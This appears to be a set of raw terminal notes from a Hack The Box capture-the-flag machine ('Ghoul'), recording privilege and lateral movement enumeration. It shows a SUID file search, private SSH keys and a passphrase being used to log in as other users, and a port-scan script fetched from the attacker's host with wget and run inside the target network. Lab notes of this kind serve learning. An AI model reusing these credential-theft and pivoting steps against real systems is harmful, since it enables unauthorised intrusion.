+kaneki_+    235    194  0 18:45 pts/2    00:00:00 ps -ef
+kaneki_pub@kaneki-pc:~$ 
+kaneki_pub@kaneki-pc:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/bin/umount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+kaneki_pub@kaneki-pc:~$ 
+kaneki_pub@kaneki-pc:~$ ls -la ~/.ssh/
+total 20
+drwx------ 2 kaneki_pub kaneki_pub 4096 Dec 16 07:36 .
+drwx------ 3 kaneki_pub kaneki_pub 4096 Dec 16 07:36 ..
+-rwx------ 1 kaneki_pub kaneki_pub  398 Dec 16 07:36 authorized_keys
+-rwx------ 1 kaneki_pub kaneki_pub 1766 Dec 16 07:36 id_rsa
+-rwx------ 1 kaneki_pub kaneki_pub  398 Dec 16 07:36 id_rsa.pub
+kaneki_pub@kaneki-pc:~$ 
+
+kaneki_pub@kaneki-pc:/home$ ssh kaneki_pub@172.18.0.200
+Enter passphrase for key '/home/kaneki_pub/.ssh/id_rsa': ILoveTouka
+Last login: Thu May 23 18:35:45 2019 from 172.20.0.10
+kaneki_pub@kaneki-pc:~$ ls -a
+.   .bash_history  .bashrc   .ssh      .wget-hsts
+..  .bash_logout   .profile  .viminfo  to-do.txt
+kaneki_pub@kaneki-pc:~$ 
+
+
+
+
+kaneki@Aogiri:~$ ssh kaneki_pub@172.20.0.150
+
+
+kaneki_pub@kaneki-pc:~$ ls -a
+.   .bash_history  .bashrc   .ssh      .wget-hsts  cuff_web_1.cuff_default:3000  id_rsa      kaneki-pc_le-03-06-19  to-do.txt
+..  .bash_logout   .profile  .viminfo  LinEnum.sh  eto                           index.html  nmap
+
+
+
+oot@kali:~/HTB/Ghoul/found# ssh -i eto Eto@ghoul.htb
+Eto@Aogiri:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .profile  .ssh  alert.txt
+Eto@Aogiri:~$ cat alert.txt
+Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!
+Eto@Aogiri:~$ 
+
+Eto@Aogiri:~$ find / -name git
+/usr/bin/git
+/usr/share/lintian/overrides/git
+/usr/share/bash-completion/completions/git
+/usr/share/doc/git
+/usr/lib/git-core/git
+/var/lib/git
+
+Eto@Aogiri:~$ cat .gitconfig
+[user]
+	name = AogiriTest
+Eto@Aogiri:~$
+
+
+
+
+SCAN 172.20.0.150 OPEN PORTS
+
+kaneki@Aogiri:~$ wget http://10.10.16.45:8000/portscan.py .
+--2019-06-13 21:13:19--  http://10.10.16.45:8000/portscan.py
+Connecting to 10.10.16.45:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 240 [text/plain]
+Saving to: ‘portscan.py’
+
+portscan.py                      100%[=========================================================>]     240  --.-KB/s    in 0s      
+
+2019-06-13 21:13:21 (13.0 MB/s) - ‘portscan.py’ saved [240/240]
+
+--2019-06-13 21:13:21--  http://./
+Resolving . (.)... failed: Temporary failure in name resolution.
+wget: unable to resolve host address ‘.’
+FINISHED --2019-06-13 21:13:21--
+Total wall clock time: 2.0s
+Downloaded: 1 files, 240 in 0s (13.0 MB/s)
+kaneki@Aogiri:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .profile  .ssh  .viminfo  note.txt  notes  portscan.py  secret.jpg  user.txt
+kaneki@Aogiri:~$ chmod +x portscan.py
+kaneki@Aogiri:~$ python3 portscan.py
+PORT OPEN:  22
+kaneki@Aogiri:~$ 
+
+
+
+
+root@kali:~/HTB/Ghoul# ssh -i noro.backup noro@ghoul.htb
+noro@Aogiri:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .profile  .ssh  .viminfo  to-do.txt
+noro@Aogiri:~$ cat to-do.txt
+Need to update backups.
+
